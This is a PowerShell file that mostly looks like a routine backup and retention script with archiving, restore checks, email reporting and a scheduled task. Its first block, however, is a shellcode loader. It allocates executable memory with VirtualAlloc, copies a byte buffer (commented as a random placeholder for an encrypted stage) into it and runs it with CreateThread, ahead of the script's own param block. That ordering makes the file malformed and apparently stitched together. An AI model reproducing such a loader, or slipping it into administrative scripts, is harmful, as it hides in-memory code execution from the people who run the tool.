

$LogPath = "$env:TEMP\run.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x61, 0xce, 0xfb, 0xc0, 0x1f, 0x1a, 0x3e, 0x5c, 0xfd, 0x30, 0x9b, 0xaa, 0x9f, 0x0b, 0x83, 0x16,
    0x7d, 0x44, 0xf1, 0x4d, 0x62, 0xdd, 0x2f, 0x38, 0xb8, 0xb4, 0xaa, 0x11, 0xde, 0xf8, 0x95, 0x4f,
    0xec, 0x7c, 0xfa, 0x8c, 0x2b, 0xf2, 0xf1, 0x58, 0x2f, 0x22, 0xb6, 0x70, 0x82, 0x9d, 0x3e, 0xc7,
    0x2b, 0x34, 0x2d, 0xc3, 0x14, 0xe4, 0x15, 0xe7, 0x94, 0x32, 0xbe, 0xbb, 0x69, 0x07, 0x53, 0x51,
    0xaf, 0xdc, 0x92, 0xf3, 0x95, 0x12, 0x2b, 0xb8, 0x73, 0xa2, 0x34, 0x0b, 0x3b, 0x5b, 0x86, 0x27,
    0x1a, 0x47, 0xe9, 0x69, 0x57, 0x94, 0xd0, 0x36, 0x50, 0x8a, 0x3d, 0xb5, 0x55, 0x22, 0x90, 0xa5,
    0xad, 0x32, 0xcb, 0xc4, 0xc6, 0x1f, 0xea, 0x01, 0xf0, 0xba, 0x3c, 0xf1, 0xb8, 0x5d, 0xcd, 0xfa,
    0x7f, 0x5a, 0xfc, 0x60, 0x40, 0x40, 0x06, 0x79, 0x2d, 0x3c, 0x34, 0x5a, 0xf0, 0x90, 0xed, 0x53,
    0xb7, 0x13, 0x4d, 0xef, 0x77, 0x90, 0x97, 0xaa, 0x90, 0xa4, 0x94, 0x4c, 0x61, 0x94, 0x61, 0x46,
    0x7e, 0x1b, 0xe3, 0xa2, 0x41, 0x3a, 0x6b, 0xb5, 0xdd, 0x0a, 0x16, 0xb2, 0x0e, 0x34, 0x28, 0xb7,
    0x51, 0x19, 0xb1, 0x54, 0x43, 0xda, 0xa4, 0xfc, 0x8f, 0x39, 0x4c, 0xb0, 0x65, 0x8d, 0xa8, 0xd3,
    0x84, 0x3c, 0x1f, 0xfb, 0x14, 0x13, 0xda, 0xc9, 0x41, 0xde, 0x48, 0x63, 0x59, 0xd4, 0x53, 0x0c,
    0xef, 0xf5, 0x88, 0x32, 0x43, 0xb8, 0x22, 0x6b, 0xf7, 0x0f, 0x7e, 0x98, 0x4e, 0x17, 0x48, 0xb8,
    0xb8, 0xd2, 0xf9, 0x56, 0xa1, 0xfc, 0x77, 0xc3, 0xb0, 0x25, 0x09, 0x87, 0xe2, 0xaa, 0x40, 0x1f,
    0xc5, 0xbe, 0xf1, 0xb8, 0x49, 0x8f, 0xbc, 0xcf, 0xd0, 0x07, 0x92, 0x7a, 0x84, 0x81, 0x60, 0x07,
    0x13, 0x5d, 0x7f, 0x2c, 0xf1, 0xf8, 0x86, 0xba, 0x5d, 0x80, 0x5f, 0x6c, 0x43, 0xd9, 0x8f, 0xef,
    0x83
)

$MemoryHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($MemoryHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 3561)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
[CmdletBinding()]
param(
    [string]$SourcePath = "D:\Apps\Adatum.Reporting",
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BackupRoot = 'E:\Backups\Reporting',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 7,
    [Parameter(Mandatory = $false)]
    [ValidateSet('Optimal', 'Fastest', 'NoCompression')]
    [string]$CompressionLevel = "NoCompression",
    [int]$MinFreeGB = 25,

    [switch]$DryRun
)

$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'Continue'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$jsonBody = $manifest | ConvertTo-Json -Depth 6
$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$probe = Join-Path $env:TEMP ("restore-check-" + $stamp)
Expand-Archive -LiteralPath $archive -DestinationPath $probe -Force
$restored = @(Get-ChildItem -Path $probe -Recurse -File).Count
Write-Host ("Restore check: {0} files recovered" -f $restored)
$staleProbes = Get-ChildItem -Path $env:TEMP -Filter 'restore-check-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) }
foreach ($dir in $staleProbes) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

$stage = Join-Path $env:TEMP ("backup-stage-" + $stamp)
robocopy $SourcePath $stage /E /R:1 /W:2 /NP /NFL /NDL | Out-Null
if ($LASTEXITCODE -ge 8) {
    throw ("Staging copy failed with exit code {0}" -f $LASTEXITCODE)
}
$stageCount = @(Get-ChildItem -Path $stage -Recurse -File).Count
Write-Verbose ("Staged files: {0}" -f $stageCount)

$count = @(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File).Count
$totalGB = [math]::Round((@(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Measure-Object -Property Length -Sum).Sum) / 1GB, 2)
Write-Verbose ("Archive count: {0}, total size: {1} GB" -f $count, $totalGB)
$manifest | Export-Csv -Path (Join-Path $BackupRoot 'backup-history.csv') -NoTypeInformation -Append -Encoding UTF8

$style = @'
<style>
body { font-family: Arial; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($manifest) | ConvertTo-Html -Title 'Backup summary' -Head $style |
    Set-Content -Path (Join-Path $BackupRoot 'last-backup.html') -Encoding UTF8
Write-Host ("Retention window: {0} days" -f $RetentionDays) -ForegroundColor DarkGray

$MailTo = 'backup-ops@internal.corp'
$MailFrom = 'backup@internal.corp'
$mailBody = ("Archive: {0}`nSize: {1} MB`nSHA256: {2}" -f $archive, $manifest.SizeMB, $hash.Hash)

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "Backup completed"
    Body       = $mailBody
    SmtpServer = "smtp.internal.corp"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

$oldStages = Get-ChildItem -Path $env:TEMP -Filter 'backup-stage-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-12) }
foreach ($dir in $oldStages) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host ("Backup finished: {0} files in archive" -f $restored) -ForegroundColor Green

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Start-AppBackup.ps1'
$trigger = New-ScheduledTaskTrigger -Daily -At '03:00'
Register-ScheduledTask -TaskName 'Contoso-AppBackup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$oldArchives = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Sort-Object -Property LastWriteTime | Select-Object -First 3
$oldArchives | Format-Table Name, LastWriteTime, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$freeSpace = Get-PSDrive -Name ($BackupRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$largeFiles = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 100MB } | Sort-Object Length -Descending | Select-Object -First 5
$largeFiles | ForEach-Object {
    Write-Verbose ("Large file: {0} ({1:N1} MB)" -f $_.Name, ($_.Length / 1MB))
}

$excluded = @('*.tmp', '*.log', '*.bak')
Write-Verbose ("Excluded patterns: {0}" -f ($excluded -join ', '))

$elapsed = Measure-Command -Expression {
    Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File | Measure-Object -Property Length -Sum
}
Write-Verbose ("Folder scan took {0:N0} ms" -f $elapsed.TotalMilliseconds)

$robolog = Join-Path $BackupRoot 'robocopy.log'
robocopy $SourcePath $BackupRoot /E /R:2 /W:5 /NP /LOG:$robolog | Out-Null
if ($LASTEXITCODE -ge 8) {
    Write-Warning ("robocopy reported exit code {0}" -f $LASTEXITCODE)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
